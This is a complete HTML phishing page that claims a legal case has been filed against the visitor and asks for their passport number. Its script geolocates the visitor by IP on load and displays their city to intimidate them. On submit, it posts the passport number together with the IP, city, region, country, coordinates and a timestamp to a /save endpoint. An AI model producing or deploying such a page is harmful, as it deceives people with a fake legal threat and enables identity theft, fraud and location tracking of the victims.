<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Case Submission Notice</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
        }
        .logo {
            width: 100px;
            height: 100px;
            margin-bottom: 1rem;
        }
        input {
            width: 100%;
            padding: 0.5rem;
            margin: 1rem 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            background-color: #ff4444;
            color: white;
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #cc0000;
        }
        #location {
            margin-top: 1rem;
            font-style: italic;
            color: #555;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="/logo.png" alt="Official Logo" class="logo">
        <h2>A Case Has Been Submitted Against You</h2>
        <p>Enter your passport number to see details</p>
        <input type="text" id="passport" placeholder="Enter Passport Number">
        <button onclick="submitData()">Submit</button>
        <div id="location">Detecting your location...</div>
    </div>

    <script>
        // Fetch IP and city on page load
        async function getCityFromIP() {
            try {
                // Get IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // Get location from IP
                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                const locationData = await locationResponse.json();
                const city = locationData.city || 'Unknown';

                // Display the city
                document.getElementById('location').textContent = `You are accessing this from ${city}`;
            } catch (error) {
                document.getElementById('location').textContent = 'Unable to detect location';
                console.error('Error fetching location:', error);
            }
        }

        // Submit form data (existing function)
        async function submitData() {
            const passport = document.getElementById('passport').value;
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const locationData = await locationResponse.json();

            const data = {
                passport: passport,
                ip: ip,
                location: {
                    city: locationData.city,
                    region: locationData.region,
                    country: locationData.country_name,
                    latitude: locationData.latitude,
                    longitude: locationData.longitude
                },
                timestamp: new Date().toISOString()
            };

            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            alert('Data submitted successfully');
        }

        // Load city when page loads
        window.onload = getCityFromIP;
    </script>
</body>
</html>
